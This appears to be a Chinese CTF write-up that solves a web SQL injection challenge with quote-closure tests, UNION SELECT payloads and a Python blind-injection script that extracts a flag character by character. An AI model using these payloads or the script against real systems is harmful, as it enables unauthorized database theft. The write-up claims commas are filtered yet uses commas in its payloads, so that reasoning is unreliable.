CTF 处女秀：某次比赛 Web 题解

2026-09-10 · CTF Web

📌 题目信息

  • 比赛名称： XXX CTF 2026
  • 题目类型： Web
  • 题目名称： Easy_SQL
  • 分值： 500

🔍 信息收集

打开靶机，页面是一个简单的登录框。查看源码和请求包，发现后端是 PHP，且存在 id 参数可控。

尝试 ?id=1' 报错，确认存在 SQL 注入。

💥 解题过程

1. 判断闭合方式

输入 ?id=1'--+ 页面正常，说明是单引号闭合。

2. 联合查询注入

先判断字段数：

?id=1' order by 3--+

第 4 个字段报错，说明有 3 个字段。接着爆库名：

?id=-1' union select 1,2,database()--+

得到库名 ctf_db。

3. 编写 Python 脚本自动化盲注

由于题目过滤了逗号，手工注入较慢，写了个简单的二分法盲注脚本：

import requests
import string

url = "http://target.com/index.php?id=1' and %s--+"
flag = ""

for i in range(1, 50):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"ascii(substr((select flag from flag),{i},1))>{mid}"
        r = requests.get(url % payload)
        if "Welcome" in r.text:
            low = mid + 1
        else:
            high = mid
    if low == 32:
        break
    flag += chr(low)
    print(flag)

🏁 Flag

运行脚本得到最终 Flag：

flag{SQL_1nj3ct10n_1s_e4sy_2026}

📝 总结

  • 遇到注入点先测试闭合方式，再用联合查询。
  • 被过滤时不要慌，尝试盲注或写脚本自动化。
